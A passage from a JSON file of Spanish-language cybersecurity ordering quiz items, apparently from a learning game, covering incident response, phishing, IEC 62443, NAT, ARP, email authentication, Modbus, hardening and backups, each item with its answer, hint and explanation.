de entrada", "Restaurar desde una copia limpia", "Vigilar de cerca durante días"], "correct": [0, 1, 2, 3, 4], "start": [3, 1, 0, 4, 2], "answer": "Contener, investigar, cerrar, restaurar, vigilar", "hint": "Si restauras sin cerrar la puerta, vuelven a entrar.", "why": "Restaurar antes de cerrar la vía de entrada es invitar al atacante a cifrarlo todo otra vez.", "fix": "Comprueba que la copia es anterior al compromiso antes de restaurar."}, {"id": "R157", "type": "order", "tag": "Phishing", "level": "facil", "lives": 3, "q": "Un usuario pulsó un enlace de phishing e introdujo su contraseña. Ordena qué hacer.", "items": ["Cambiar la contraseña", "Cerrar todas sus sesiones abiertas", "Revisar reglas de correo y accesos recientes", "Avisar a quienes recibieron el mismo correo"], "correct": [0, 1, 2, 3], "start": [2, 3, 0, 1], "answer": "Contraseña, sesiones, revisar, avisar", "hint": "Primero, que deje de valer lo que robaron.", "why": "Cambiar la contraseña no basta si el atacante ya tiene sesiones abiertas o creó reglas de reenvío.", "fix": "MFA resistente a phishing evita la mayoría de estos casos."}, {"id": "R158", "type": "order", "tag": "Riesgo", "level": "medio", "lives": 3, "q": "Ordena un análisis de riesgos sencillo según IEC 62443-3-2.", "items": ["Identificar el sistema y sus activos", "Dividirlo en zonas y conductos", "Evaluar amenazas y consecuencias", "Definir el nivel de seguridad objetivo", "Aplicar contramedidas"], "correct": [0, 1, 2, 3, 4], "start": [4, 2, 0, 1, 3], "answer": "Activos, zonas, amenazas, objetivo, contramedidas", "hint": "No puedes proteger lo que no conoces.", "why": "Primero se conoce el sistema, luego se divide, se evalúa el riesgo y se decide cuánto proteger cada zona.", "fix": "Repite el análisis cuando cambie la instalación."}, {"id": "R159", "type": "order", "tag": "Pentest", "level": "medio", "lives": 3, "q": "Ordena las fases de una prueba de intrusión.", "items": ["Acordar alcance y permisos", "Reconocimiento", "Explotación", "Escalada y movimiento", "Informe con recomendaciones"], "correct": [0, 1, 2, 3, 4], "start": [4, 1, 3, 2, 0], "answer": "Alcance, reconocimiento, explotación, escalada, informe", "hint": "Sin permiso no es un pentest.", "why": "Todo empieza por un alcance firmado y termina con recomendaciones accionables.", "fix": "En OT, define también qué no se puede tocar en ningún caso."}, {"id": "R160", "type": "order", "tag": "Accesos", "level": "medio", "lives": 3, "q": "Ordena el ciclo de un acceso remoto de proveedor bien gestionado.", "items": ["El proveedor solicita acceso con motivo", "Alguien de planta lo aprueba", "Se activa su cuenta temporalmente", "Trabaja con la sesión grabada", "Se desactiva la cuenta al terminar"], "correct": [0, 1, 2, 3, 4], "start": [2, 4, 0, 3, 1], "answer": "Solicitud, aprobación, activación, sesión grabada, desactivación", "hint": "Nada empieza sin una petición.", "why": "El acceso existe solo el tiempo necesario, con aprobación previa y registro de lo que se hizo.", "fix": "Automatiza la desactivación para que no dependa de acordarse."}, {"id": "R161", "type": "order", "tag": "Enrutamiento", "level": "medio", "lives": 3, "q": "Un paquete sale de tu PC hacia una web en internet. Ordena por dónde pasa.", "items": ["Tu PC", "El switch de acceso", "La puerta de enlace", "El firewall perimetral", "El router del operador"], "correct": [0, 1, 2, 3, 4], "start": [4, 0, 2, 1, 3], "answer": "PC, switch, gateway, firewall y operador", "hint": "De lo más cercano a lo más lejano.", "why": "El paquete sale por el switch hasta el gateway, cruza el firewall y llega al operador.", "fix": "Cada salto es un punto donde puedes registrar y filtrar."}, {"id": "R162", "type": "order", "tag": "NAT", "level": "dificil", "lives": 3, "q": "Ordena qué pasa cuando un equipo interno navega a través de NAT.", "items": ["El equipo envía el paquete con su IP privada", "El firewall cambia el origen por su IP pública", "Guarda la traducción en su tabla", "La respuesta llega a la IP pública", "El firewall la devuelve al equipo interno"], "correct": [0, 1, 2, 3, 4], "start": [1, 3, 0, 4, 2], "answer": "IP privada, traducción, tabla, respuesta y devolución", "hint": "La tabla es lo que permite deshacer el cambio.", "why": "El firewall recuerda cada traducción para saber a qué equipo interno pertenece cada respuesta.", "fix": "Registra las traducciones de NAT: sin ellas no sabrás qué equipo hizo cada conexión."}, {"id": "R163", "type": "order", "tag": "ARP", "level": "medio", "lives": 3, "q": "Ordena cómo descubre tu PC la MAC de la puerta de enlace.", "items": ["Mira su caché ARP y no la tiene", "Envía una petición ARP por broadcast", "La puerta de enlace responde con su MAC", "El PC guarda la respuesta en caché"], "correct": [0, 1, 2, 3], "start": [3, 2, 1, 0], "answer": "Caché, broadcast, respuesta y guardado", "hint": "Primero mira si ya la sabe.", "why": "ARP pregunta a todos y cree al que responde, sin verificar: por eso se puede envenenar.", "fix": "Dynamic ARP Inspection en los switches."}, {"id": "R164", "type": "order", "tag": "Correo", "level": "medio", "lives": 3, "q": "Ordena cómo comprueba el servidor de destino un correo que dice venir de tu dominio.", "items": ["Recibe el correo", "Comprueba SPF: si el servidor emisor está autorizado", "Comprueba DKIM: si la firma es válida", "Aplica DMARC: si coinciden con el remitente visible", "Entrega, marca como spam o rechaza"], "correct": [0, 1, 2, 3, 4], "start": [4, 2, 0, 3, 1], "answer": "Recepción, SPF, DKIM, DMARC y decisión", "hint": "DMARC decide con lo que dicen los otros dos.", "why": "SPF y DKIM aportan pruebas y DMARC decide qué hacer según tu política.", "fix": "Publica los tres y revisa los informes DMARC."}, {"id": "R165", "type": "order", "tag": "Cambios", "level": "medio", "lives": 3, "q": "Ordena un cambio en el firewall entre IT y OT.", "items": ["Solicitud con justificación", "Revisión de riesgo", "Aprobación de operación y seguridad", "Aplicación en ventana acordada", "Verificación y documentación"], "correct": [0, 1, 2, 3, 4], "start": [2, 4, 1, 3, 0], "answer": "Solicitud, revisión, aprobación, aplicación, verificación", "hint": "Primero el porqué.", "why": "Un cambio en la frontera IT/OT puede abrir la planta: se justifica, se evalúa y se aprueba antes de tocarlo.", "fix": "Revisa periódicamente que cada regla sigue teniendo su justificación."}, {"id": "R166", "type": "order", "tag": "Vulnerabilidades", "level": "medio", "lives": 3, "q": "Ordena la gestión de una vulnerabilidad recién publicada.", "items": ["Saber si te afecta (inventario)", "Valorar el riesgo en tu contexto", "Mitigar o parchear", "Comprobar que se ha corregido"], "correct": [0, 1, 2, 3], "start": [3, 1, 0, 2], "answer": "Inventario, riesgo, corrección y verificación", "hint": "Sin inventario no sabes si te afecta.", "why": "Sin inventario no sabes si tienes el equipo vulnerable; sin verificar no sabes si lo arreglaste.", "fix": "Mantén un inventario vivo de activos y versiones."}, {"id": "R167", "type": "order", "tag": "VPN", "level": "medio", "lives": 3, "q": "Ordena el establecimiento de un túnel IPsec.", "items": ["Fase 1: se autentican los extremos", "Se crea un canal seguro para negociar", "Fase 2: se acuerdan las claves del tráfico", "El tráfico viaja cifrado por el túnel"], "correct": [0, 1, 2, 3], "start": [2, 0, 3, 1], "answer": "Fase 1, canal seguro, fase 2, tráfico", "hint": "Primero, saber con quién hablas.", "why": "IKE primero autentica y protege la negociación; después acuerda las claves con las que se cifra el tráfico.", "fix": "Usa algoritmos actuales y certificados en lugar de claves compartidas débiles."}, {"id": "R168", "type": "order", "tag": "Hardening", "level": "facil", "lives": 3, "q": "Vas a poner en red un switch nuevo. Ordena las tareas.", "items": ["Actualizar el firmware", "Cambiar las credenciales por defecto", "Desactivar servicios que no usas", "Configurar el registro hacia el servidor central", "Conectarlo a producción"], "correct": [0, 1, 2, 3, 4], "start": [4, 1, 3, 0, 2], "answer": "Firmware, credenciales, servicios, registro y producción", "hint": "Lo último es conectarlo.", "why": "Un equipo con firmware viejo y credenciales por defecto no debe tocar la red de producción.", "fix": "Ten una plantilla de bastionado para cada tipo de equipo."}, {"id": "R169", "type": "order", "tag": "Modbus", "level": "dificil", "lives": 3, "q": "Ordena una lectura Modbus TCP.", "items": ["El cliente abre conexión TCP al puerto 502", "Envía la petición con la función 03 y la dirección", "El PLC lee los registros", "El PLC responde con los valores"], "correct": [0, 1, 2, 3], "start": [3, 2, 0, 1], "answer": "Conexión, petición, lectura y respuesta", "hint": "Sin TCP no hay Modbus TCP.", "why": "El cliente se conecta al 502, pide los registros con la función 03 y el PLC responde. En ningún paso se comprueba quién pregunta.", "fix": "Filtra quién puede llegar al 502 y qué funciones puede usar."}, {"id": "R170", "type": "order", "tag": "OSI", "level": "facil", "lives": 3, "q": "Ordena las capas del modelo OSI, de abajo arriba.", "items": ["Física", "Enlace", "Red", "Transporte", "Aplicación"], "correct": [0, 1, 2, 3, 4], "start": [4, 2, 0, 3, 1], "answer": "Física, enlace, red, transporte, aplicación", "hint": "Empieza por los cables.", "why": "Cada capa se apoya en la de abajo: bits, tramas, paquetes, segmentos y datos de aplicación.", "fix": "Piensa en defensas en cada capa, no solo en la de red."}, {"id": "R171", "type": "order", "tag": "Identidad", "level": "medio", "lives": 3, "q": "Un empleado deja la empresa. Ordena qué hacer con sus accesos.", "items": ["Desactivar su cuenta principal", "Revocar sesiones y tokens activos", "Retirar accesos a VPN y sistemas externos", "Recoger sus equipos y llaves"], "correct": [0, 1, 2, 3], "start": [3, 1, 0, 2], "answer": "Cuenta, sesiones, accesos externos y equipos", "hint": "Lo primero es la llave maestra.", "why": "Desactivar la cuenta corta el acceso principal; las sesiones y los accesos externos pueden seguir vivos si no se revocan.", "fix": "Automatiza las bajas desde recursos humanos."}, {"id": "R172", "type": "order", "tag": "Copias", "level": "facil", "lives": 3, "q": "Ordena la regla 3-2-1 de copias de seguridad.", "items": ["3 copias de los datos", "en 2 soportes distintos", "con 1 copia fuera del sitio"], "correct": [0, 1, 2], "start": [2, 0, 1], "answer": "3 copias, 2
